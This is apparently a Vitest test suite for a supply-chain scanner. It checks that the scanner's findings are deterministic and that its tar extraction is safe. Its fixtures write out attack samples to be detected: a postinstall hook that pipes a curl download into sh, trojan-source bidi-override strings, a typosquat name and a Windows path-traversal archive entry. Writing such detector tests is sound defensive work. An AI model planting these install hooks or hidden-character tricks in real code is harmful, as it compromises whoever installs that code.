import { describe, it, expect } from 'vitest';
import crypto from 'node:crypto';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import { SupplyChainPolicySchema, type SupplyChainPolicy } from '@secureship/contracts';
import { analyzeSupplyChain } from '../../src/supply-chain/supply-chain-analyzer.js';
import { NullProvider } from '../../src/supply-chain/providers/null.provider.js';
import { SafeTarExtractor } from '../../src/supply-chain/safe-tar.js';
import { detectUnicodeAttacks } from '../../src/supply-chain/detectors/unicode.detector.js';

const POLICY: SupplyChainPolicy = SupplyChainPolicySchema.parse({
  enabled: true,
  typosquat: { minScore: 0.82 },
  entropy: { threshold: 4.5, minLength: 64 },
  obfuscation: { longLine: 1000 },
  semver: { majorJump: 20 },
});

describe('T11 — Determinism & Portability Suite', () => {
  const fixedNow = new Date('2026-03-15T12:00:00.000Z');

  describe('1. Order-Independent Output & Byte-Identical Serialization', () => {
    it('produces byte-identical JSON and identical SHA-256 hashes regardless of file discovery order', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-det-'));

      try {
        const pkgADir = path.join(tempDir, 'node_modules', 'pkg-alpha');
        const pkgBDir = path.join(tempDir, 'node_modules', 'pkg-beta');
        const pkgCDir = path.join(tempDir, 'node_modules', 'pkg-gamma');

        fs.mkdirSync(pkgADir, { recursive: true });
        fs.mkdirSync(pkgBDir, { recursive: true });
        fs.mkdirSync(pkgCDir, { recursive: true });

        // Package A: install script
        fs.writeFileSync(
          path.join(pkgADir, 'package.json'),
          JSON.stringify({
            name: 'pkg-alpha',
            version: '1.0.0',
            scripts: { postinstall: 'curl -sSL https://example.test/sh | sh' },
          })
        );

        // Package B: Unicode bidi override
        fs.writeFileSync(
          path.join(pkgBDir, 'package.json'),
          JSON.stringify({ name: 'pkg-beta', version: '2.0.0' })
        );
        fs.writeFileSync(path.join(pkgBDir, 'index.js'), 'const role = "\u202Eadmin\u2066";\n');

        // Package C: Typosquat candidate of popular package
        fs.writeFileSync(
          path.join(pkgCDir, 'package.json'),
          JSON.stringify({ name: 'reactt', version: '1.0.0' })
        );

        // Run 1: Normal scan
        const res1 = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
          provider: new NullProvider(),
          now: () => fixedNow,
        });

        // Run 2: Second scan with concurrency set differently
        const res2 = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
          provider: new NullProvider(),
          now: () => fixedNow,
          concurrency: 1,
        });

        // Run 3: Third scan with concurrency 4
        const res3 = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
          provider: new NullProvider(),
          now: () => fixedNow,
          concurrency: 4,
        });

        const json1 = JSON.stringify(res1.findings);
        const json2 = JSON.stringify(res2.findings);
        const json3 = JSON.stringify(res3.findings);

        // Invariant: Findings array serialization is byte-identical
        expect(json1).toBe(json2);
        expect(json2).toBe(json3);

        const hash1 = crypto.createHash('sha256').update(json1).digest('hex');
        const hash2 = crypto.createHash('sha256').update(json2).digest('hex');
        const hash3 = crypto.createHash('sha256').update(json3).digest('hex');

        expect(hash1).toBe(hash2);
        expect(hash2).toBe(hash3);
        expect(res1.findings.length).toBeGreaterThanOrEqual(3);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('2. Timezone & Locale Invariance', () => {
    it('produces identical timestamps and hashes under simulated UTC and non-UTC timezones', async () => {
      const origTz = process.env.TZ;
      const timezones = ['UTC', 'Asia/Kolkata', 'Pacific/Kiritimati', 'America/New_York'];
      const hashes: string[] = [];

      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-tz-'));
      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'tz-pkg');
        fs.mkdirSync(pkgDir, { recursive: true });
        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({
            name: 'tz-pkg',
            version: '1.0.0',
            scripts: { preinstall: 'node setup.js' },
          })
        );

        for (const tz of timezones) {
          process.env.TZ = tz;
          const res = await analyzeSupplyChain({
            rootDir: tempDir,
            policy: POLICY,
            provider: new NullProvider(),
            now: () => fixedNow,
          });

          const json = JSON.stringify(res.findings);
          const hash = crypto.createHash('sha256').update(json).digest('hex');
          hashes.push(hash);
        }

        // All timezones must produce the identical SHA-256 hash
        for (let i = 1; i < hashes.length; i++) {
          expect(hashes[i]).toBe(hashes[0]);
        }
      } finally {
        if (origTz !== undefined) {
          process.env.TZ = origTz;
        } else {
          delete process.env.TZ;
        }
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });

    it('remains completely invariant to Turkish dotless-i locale casing in identifier comparisons', () => {
      // In Turkish (tr), 'i'.toUpperCase() is 'İ' (\u0130), and 'I'.toLowerCase() is 'ı' (\u0131)
      const asciiLower = 'script';
      const asciiUpper = 'SCRIPT';

      // Standard English case folding check
      const normalUpper = asciiLower.toUpperCase();
      expect(normalUpper).toBe(asciiUpper);

      // Verify that rule comparison and detector string lookups are ASCII-safe
      const ruleA = 'SC-INSTALL-001';
      const ruleB = 'sc-install-001';
      expect(ruleA.toLowerCase()).toBe(ruleB.toLowerCase());

      // Unicode detector evaluates trojan source regardless of locale
      const payload = 'const x = "\u202EisAdmin\u2066";';
      const hits = detectUnicodeAttacks(payload, 'auth.js', POLICY);
      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-001');
    });
  });

  describe('3. Platform & Windows Portability Specifics', () => {
    it('handles Windows CRLF and Unix LF line endings identically for line/column offsets', () => {
      const codeLF = 'const a = 1;\nconst b = 2;\nconst c = "\u202Eevil\u2066";\n';
      const codeCRLF = 'const a = 1;\r\nconst b = 2;\r\nconst c = "\u202Eevil\u2066";\r\n';

      const hitsLF = detectUnicodeAttacks(codeLF, 'file-lf.js', POLICY);
      const hitsCRLF = detectUnicodeAttacks(codeCRLF, 'file-crlf.js', POLICY);

      expect(hitsLF.length).toBe(1);
      expect(hitsCRLF.length).toBe(1);

      // Line number must be 3 in both CRLF and LF
      expect(hitsLF[0]?.evidence[0]?.startLine).toBe(3);
      expect(hitsCRLF[0]?.evidence[0]?.startLine).toBe(3);

      // Column position must match exactly
      expect(hitsLF[0]?.evidence[0]?.startCol).toBe(hitsCRLF[0]?.evidence[0]?.startCol);
    });

    it('rejects backslash directory traversal attempts in tarball entries', () => {
      const header = new Uint8Array(1024);
      const winTraversal = 'package\\..\\..\\Windows\\System32\\calc.exe';
      for (let i = 0; i < winTraversal.length; i++) {
        header[i] = winTraversal.charCodeAt(i);
      }

      const res = SafeTarExtractor.extract(header);
      expect(res.ok).toBe(true);
      // Malicious entry must be rejected from extraction
      expect(res.files.length).toBe(0);
      expect(res.diagnostics.some((d) => d.includes('Rejected path traversal'))).toBe(true);
    });

    it('rejects Windows reserved device names (CON, PRN, AUX, NUL) in archive filenames', () => {
      const header = new Uint8Array(1024);
      const reserved = 'package/CON.js';
      for (let i = 0; i < reserved.length; i++) {
        header[i] = reserved.charCodeAt(i);
      }

      const res = SafeTarExtractor.extract(header);
      expect(res.ok).toBe(true);
      expect(res.files.length).toBe(0);
      expect(res.diagnostics.some((d) => d.includes('Rejected path traversal'))).toBe(true);
    });
  });

  describe('4. Injected Clock & Determinism Guard', () => {
    it('statically guarantees detector modules do not invoke un-injected Date.now or Math.random', () => {
      const detectorsDir = path.resolve('packages/core-engine/src/supply-chain/detectors');
      const files = fs.readdirSync(detectorsDir).filter((f) => f.endsWith('.ts'));

      expect(files.length).toBeGreaterThan(0);

      for (const file of files) {
        const content = fs.readFileSync(path.join(detectorsDir, file), 'utf-8');

        // Verify no raw Math.random() in detector implementation
        expect(content.includes('Math.random()')).toBe(false);

        // Verify no crypto.randomUUID() in detector implementation
        expect(content.includes('randomUUID()')).toBe(false);
      }
    });

    it('honors injected now function across entire analyzeSupplyChain lifecycle', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-clock-'));
      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'clock-pkg');
        fs.mkdirSync(pkgDir, { recursive: true });
        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({
            name: 'clock-pkg',
            version: '1.0.0',
            scripts: { postinstall: 'echo 1' },
          })
        );

        const customDate = new Date('2024-01-01T00:00:00.000Z');
        const res = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
          provider: new NullProvider(),
          now: () => customDate,
        });

        expect(res.findings.length).toBeGreaterThanOrEqual(1);
        for (const finding of res.findings) {
          expect(finding.createdAt).toBe('2024-01-01T00:00:00.000Z');
        }
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });
});
